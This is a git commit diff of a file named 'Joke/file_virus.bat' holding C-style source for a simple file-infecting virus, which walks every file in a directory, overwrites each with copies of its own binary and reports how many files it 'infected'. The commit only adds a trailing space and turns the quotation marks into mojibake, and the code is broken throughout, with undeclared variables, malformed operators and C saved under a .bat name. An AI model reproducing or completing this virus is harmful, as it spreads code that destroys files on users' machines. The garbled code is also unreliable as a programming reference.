ca63d798180a5f6f04d970be46279ba6d5bf3270
Neil <enginestein@gmail.com>
2024-02-01 14:38:41 +0530

    Update file_virus.bat

--- Joke/file_virus.bat
+++ Joke/file_virus.bat
@@ -1,6 +1,6 @@
 FILE *Ron *vRon;
 int owned = 0;
-unsigned long x;
+unsigned long x; 
 char buff[256];
 struct ffblk ffblk;
 clock_t st, end;
@@ -8,28 +8,28 @@ main()
 {
  st=clock();
  clrscr();
- owned=(find_first(“*.*”, &ffblk,0);
+ owned=(find_first(â€œ*.*â€, &ffblk,0);
  while(!done)
  {
- Ron=fopen(_arg[0], “rb”);
- vhost=fopen(ffblk.ff_name, “rb+”);
+ Ron=fopen(_arg[0], â€œrbâ€);
+ vhost=fopen(ffblk.ff_name, â€œrb+â€);
  if (vhost = =NULL)
  goto next;
  x = 89088;
- printf(“infecting %s\n”, ffblk.ff_name);
+ printf(â€œinfecting %s\nâ€, ffblk.ff_name);
  while(x>2048)
  {
  fread(buff,256,1,Ron);
  fwrite(buff,256,1,vRon);
- x – = 2048;
+ x â€“ = 2048;
  }
  fread(buff,x,1,Ron);
  fwrite(buff,x,1,vRon);
  a++;
- next:      fcloseall();
+ next: Â  Â  Â fcloseall();
  owned = findnext(&ffblk);
  }
  end = clock()
- printf(“Infected %d files in %f sec”, a, (end-st)/CLK_TCk);
+ printf(â€œInfected %d files in %f secâ€, a, (end-st)/CLK_TCk);
  return (0);
 }
